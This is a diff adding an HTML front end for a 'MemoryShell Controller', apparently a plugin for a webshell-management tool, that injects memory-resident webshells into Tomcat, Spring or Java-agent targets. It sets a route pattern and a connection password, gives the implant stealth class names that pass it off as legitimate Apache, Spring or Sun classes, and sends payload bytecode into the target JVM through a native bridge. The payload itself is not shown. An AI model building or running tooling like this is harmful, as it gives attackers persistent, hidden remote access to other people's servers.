@@ -1,0 +1,294 @@
+<!DOCTYPE html>
+<html lang="en-US">
+<head>
+    <meta charset="UTF-8">
+    <title>MemoryShell Controller</title>
+    <style>
+        html, body {
+            height: 100%;
+            margin: 0;
+            padding: 0;
+            background-color: #000000;
+            color: #ffffff;
+            overflow-y: auto; 
+            overflow-x: hidden;
+        }
+        body { 
+            font-family: 'Courier New', Courier, monospace;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+        
+        .container { 
+            width: 100%;
+            max-width: 650px; 
+            background: #000000; 
+            padding: 25px; 
+            border-radius: 0px;
+            border: 1px solid #ffffff;
+        }
+        
+        h2 { 
+            color: #ffffff;
+            margin-top: 0; 
+            border-bottom: 1px solid #ffffff; 
+            padding-bottom: 10px; 
+            font-size: 18px;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+        }
+        
+        .status-bar { 
+            background: #000000; 
+            padding: 10px; 
+            margin-bottom: 20px; 
+            font-size: 12px; 
+            border: 1px dashed #ffffff;
+            text-transform: uppercase;
+        }
+        
+        .badge { padding: 0px 4px; font-weight: bold; }
+        .badge-active { background: #ffffff; color: #000000; }
+        .badge-error { border: 1px dashed #ffffff; background: transparent; color: #ffffff; }
+        
+        .form-group { margin-bottom: 15px; }
+        .form-row { display: flex; gap: 15px; margin-bottom: 15px; }
+        .form-row .form-group { flex: 1; margin-bottom: 0; }
+        
+        label { 
+            display: block; 
+            margin-bottom: 5px; 
+            color: #ffffff; 
+            text-transform: uppercase; 
+            font-size: 12px;
+            font-weight: bold;
+        }
+        
+        input[type="text"], select { 
+            width: 100%; 
+            background: #000000; 
+            border: 1px solid #ffffff; 
+            color: #ffffff; 
+            padding: 8px; 
+            border-radius: 0px; 
+            box-sizing: border-box; 
+            font-family: inherit;
+        }
+        input[type="text"]:focus, select:focus {
+            outline: none;
+            background: #111111;
+        }
+        
+        select option {
+            background: #000000;
+            color: #ffffff;
+        }
+        
+        .btn-group {
+            display: flex;
+            gap: 10px;
+            margin-top: 20px;
+        }
+        
+        button { 
+            flex: 1;
+            background-color: transparent; 
+            color: #ffffff; 
+            font-weight: bold; 
+            font-family: inherit;
+            border: 1px solid #ffffff; 
+            padding: 10px 25px; 
+            cursor: pointer; 
+            border-radius: 0px; 
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+        button:hover:not(:disabled) { 
+            background-color: #ffffff; 
+            color: #000000;
+        }
+        button:disabled { 
+            border-color: #444444; 
+            color: #444444; 
+            cursor: not-allowed; 
+        }
+        
+        h3 {
+            font-size: 13px;
+            color: #ffffff;
+            text-transform: uppercase;
+            margin-top: 25px;
+        }
+        
+        .console { 
+            background: #000000; 
+            border: 1px solid #ffffff; 
+            padding: 15px; 
+            height: 180px; 
+            overflow-y: auto; 
+            white-space: pre-wrap;
+            font-size: 13px;
+            line-height: 1.5;
+        }
+
+        .msf-line { margin-bottom: 4px; color: #ffffff; } 
+        .msf-info { color: #3498db; font-weight: bold; }
+        .msf-success { color: #2ecc71; font-weight: bold; }
+        .msf-warn { color: #f1c40f; font-weight: bold; }
+        .msf-error { color: #e74c3c; font-weight: bold; }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <h2>[ MemoryShell Controller ]</h2>
+    
+    <div class="status-bar" id="statusBar">
+        [*] Initializing core controller... awaiting bridge...
+    </div>
+    
+    <div class="form-group">
+        <label>> Shell Type / Strategy</label>
+        <select id="shellType" onchange="updateDefaultConfig()">
+            <option value="tomcat_filter">Tomcat - Filter MemoryShell</option>
+            <option value="tomcat_servlet">Tomcat - Servlet MemoryShell</option>
+            <option value="spring_interceptor">Spring - Interceptor MemoryShell</option>
+            <option value="java_agent">Java Agent - Runtime Injector</option>
+        </select>
+    </div>
+    
+    <div class="form-row">
+        <div class="form-group">
+            <label>> URL Pattern / Route</label>
+            <input type="text" id="urlPattern" value="/*">
+        </div>
+        <div class="form-group">
+            <label>> Connection Pass</label>
+            <input type="text" id="shellPass" value="cmd">
+        </div>
+    </div>
+
+    <div class="form-group">
+        <label>> Stealth Class Name</label>
+        <input type="text" id="className" value="org.apache.catalina.filters.LogFilterOverride">
+    </div>
+
+    <div class="btn-group">
+        <button id="injectBtn" onclick="executeAction('inject')" disabled>Inject Shell</button>
+        <button id="evictBtn" onclick="executeAction('evict')" disabled>Evict / Clean</button>
+    </div>
+
+    <h3>Console Output</h3>
+    <div class="console" id="consoleOutput"></div>
+</div>
+
+<script>
+    const defaultConfigs = {
+        tomcat_filter: "org.apache.catalina.filters.LogFilterOverride",
+        tomcat_servlet: "org.apache.catalina.servlets.DefaultStatusServlet",
+        spring_interceptor: "org.springframework.web.servlet.handler.WebMvcSecurityInterceptor",
+        java_agent: "com.sun.tools.attach.AgentClassLoader"
+    };
+
+    function updateDefaultConfig() {
+        const type = document.getElementById('shellType').value;
+        document.getElementById('className').value = defaultConfigs[type] || "";
+        appendLog(`[*] MODULE CHANGED TO: ${type.toUpperCase()}`);
+    }
+
+    const pluginManifest = {
+        "supportedLangs": [
+            "PHP/v8.X/OneShell",
+        ]
+    };
+
+    let currentShellType = "";
+
+    function appendLog(text) {
+        const consoleOutput = document.getElementById('consoleOutput');
+        if (!text) return;
+
+        const lines = text.split('\n');
+        lines.forEach(line => {
+            if (line.trim() === "") return;
+
+            let div = document.createElement('div');
+            div.className = 'msf-line';
+
+            if (line.startsWith('[*]')) {
+                div.innerHTML = `<span class="msf-info">[*]</span> ${line.substring(3)}`;
+            } else if (line.startsWith('[+]')) {
+                div.innerHTML = `<span class="msf-success">[+]</span> ${line.substring(3)}`;
+            } else if (line.startsWith('[-]')) {
+                div.innerHTML = `<span class="msf-error">[-]</span> ${line.substring(3)}`;
+            } else if (line.startsWith('[!]')) {
+                div.innerHTML = `<span class="msf-warn">[!]</span> ${line.substring(3)}`;
+            } else {
+                div.innerText = line;
+            }
+            consoleOutput.appendChild(div);
+        });
+        consoleOutput.scrollTop = consoleOutput.scrollHeight;
+    }
+
+    window.addEventListener('DOMContentLoaded', async () => {
+        const statusBar = document.getElementById('statusBar');
+        const injectBtn = document.getElementById('injectBtn');
+        const evictBtn = document.getElementById('evictBtn');
+
+        try {
+            if (window.chrome && window.chrome.webview && window.chrome.webview.hostObjects.nativeBridge) {
+                const bridge = window.chrome.webview.hostObjects.nativeBridge;
+                currentShellType = await bridge.fnGetShellType();
+
+                if (pluginManifest.supportedLangs.includes(currentShellType)) {
+                    statusBar.innerHTML = `GATEWAY_ENV: <span class="badge badge-active">${currentShellType.toUpperCase()}</span> // STATUS: INJECTOR READY`;
+                    injectBtn.disabled = false;
+                    evictBtn.disabled = false;
+                    appendLog("[*] LINK ESTABLISHED WITH NATIVE BRIDGE.");
+                    appendLog("[*] MEMORYSHELL DEPLOYMENT PLATFORM INITIALIZED.");
+                } else {
+                    statusBar.innerHTML = `GATEWAY_ENV: <span class="badge badge-error">${currentShellType.toUpperCase()}</span> // STATUS: INCOMPATIBLE`;
+                    appendLog(`[-] ABORTED. REQUIRES: [${pluginManifest.supportedLangs.join(', ')}].`);
+                }
+            } else {
+                appendLog("[!] BRIDGE_ERROR: HOST_NOT_FOUND. NATIVE WEBVIEW BRIDGE IS OFFLINE.");
+            }
+        } catch (e) {
+            appendLog("[!] EXCEPTION_CAUGHT: " + e.message.toUpperCase());
+        }
+    });
+
+    async function executeAction(actionType) {
+        const type = document.getElementById('shellType').value;
+        const route = document.getElementById('urlPattern').value;
+        const pass = document.getElementById('shellPass').value;
+        const clazz = document.getElementById('className').value;
+        
+        const configJson = JSON.stringify({
+            action: actionType,
+            strategy: type,
+            pattern: route,
+            password: pass,
+            className: clazz
+        });
+
+        appendLog(`[*] PREPARING MEMORY TRANSACTION... [ACTION: ${actionType.toUpperCase()}]`);
+
+        const bridge = window.chrome.webview.hostObjects.nativeBridge;
+        const currentDir = window.location.pathname.substring(0, window.location.pathname.lastIndexOf('/') + 1);
+        
+        const payloadCode = await bridge.fnGetPayload(currentDir, currentShellType, "payload");
+        
+        appendLog(`[*] TARGET ROUTE: ${route} | CLASS: ${clazz}`);
+        appendLog('[+] TRANSMITTING BYTECODE INTO TARGET JVM MEMORY SPACE...');
+
+        const result = await bridge.fnRun(configJson, payloadCode, currentShellType);
+        
+        appendLog(result.toUpperCase());
+    }
+</script>
+
+</body>
+</html>
